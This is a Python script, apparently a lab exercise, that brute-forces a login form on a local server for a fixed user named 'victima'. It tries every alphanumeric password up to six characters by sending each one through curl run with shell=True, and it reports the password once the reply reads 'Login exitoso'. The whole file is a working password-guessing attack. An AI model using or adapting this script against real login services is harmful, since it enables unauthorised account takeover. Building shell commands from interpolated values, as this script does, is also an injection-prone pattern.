import time
import subprocess
import itertools

# Usuario fijo
usuario_fijo = "victima" 
def send_request(password):
        # Construimos el comando curl
    command = f'curl -s -X POST "http://127.0.0.1:8000/login?nombre_usuario={usuario_fijo}&contrase={password}"'
    try:
        # Ejecutamos el curl y capturamos la respuesta
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout.strip()
    except Exception:
        return ""

def main():
    # Alfabeto para las pruebas
    alfabeto = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    max_len_password = 6
    intentos = 0
    tiempo_inicio = time.time()

    for len_pass in range(1, max_len_password + 1):
        for pass_tuple in itertools.product(alfabeto, repeat=len_pass):
            intentos += 1
            password_generada = "".join(pass_tuple)
            
            # Enviamos el intento 
            respuesta = send_request(password_generada)
            
            # Buscamos si la respuesta contiene el mensaje de éxito
            if "Login exitoso" in respuesta:
                tiempo_fin = time.time()
                print(f"CONTRASEÑA ENCONTRADA: {password_generada}")
                print(f"Intentos totales: {intentos}")
                print(f"Tiempo: {tiempo_fin - tiempo_inicio:.2f} segundos")
                return
if __name__ == "__main__":
    main()